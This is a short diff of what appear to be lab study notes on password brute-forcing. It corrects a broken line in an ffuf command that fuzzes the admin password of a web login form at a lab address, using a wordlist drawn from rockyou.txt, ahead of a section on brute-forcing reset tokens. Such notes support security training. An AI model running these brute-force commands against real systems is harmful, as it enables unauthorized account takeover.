@@ -18,8 +18,7 @@ grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt | 
 ```
 
 ```bash
-ffuf -w ./custom_wordlist.txt -u http://94.237.57.154:37595/index.php -X POST -H "Content-Type: a  
-pplication/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password."
+ffuf -w ./custom_wordlist.txt -u http://94.237.57.154:37595/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password."
 ```
 
 # Brute-Forcing Password Reset Tokens
